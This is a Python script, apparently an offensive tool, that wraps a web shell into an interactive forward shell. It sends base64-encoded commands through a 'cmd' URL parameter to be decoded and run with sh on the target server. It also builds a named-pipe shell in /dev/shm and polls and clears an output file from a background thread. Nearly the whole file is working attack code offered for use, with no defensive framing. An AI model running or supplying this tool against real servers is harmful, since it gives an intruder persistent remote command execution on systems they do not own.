#!/usr/bin/env python3

import requests
import time
import threading
from base64 import b64encode
from random import randrange

class CommandExecutor:
    def __init__(self, weburl, interval=1, output_file=''):
        self.weburl = weburl
        self.interval = interval
        self.output_file = output_file
        self.input_file = f"/dev/shm/input.{randrange(1000, 9999)}"
        self.stop_event = threading.Event()
        thread = threading.Thread(target=self.run, args=())
        thread.daemon = True
        thread.start()

    def run(self):
        read_cmd = f"/bin/cat {self.output_file}"
        clear_cmd = f"echo '' > {self.output_file}"
        while not self.stop_event.is_set():
            output = self.run_command(read_cmd)
            if output:
                self.run_command(clear_cmd)
                print(output)
            time.sleep(self.interval)

    def run_command(self, cmd):
        
        cmd = cmd.encode('utf-8')
        cmd = b64encode(cmd).decode('utf-8')
        payload = {
            'cmd': f'echo {cmd} | base64 -d | sh'
        }
        result = requests.get(url=self.weburl, params=payload, timeout=5).text.strip()
        return result
        
    def stop(self):
        self.stop_event.set()

    def setup_shell(self):
        named_pipes_cmd = f"mkfifo {self.input_file}; tail -f {self.input_file} | /bin/sh 2>&1 > {self.output_file}"
        try:
            self.run_command(named_pipes_cmd)
        except:
            pass

    def write_command(self, cmd):
        cmd = cmd.encode('utf-8')
        cmd = b64encode(cmd).decode('utf-8')
        payload = {
            'cmd': f'echo {cmd} | base64 -d > {self.input_file}'
        }
        result = requests.get(url=self.weburl, params=payload, timeout=5).text.strip()
        return result

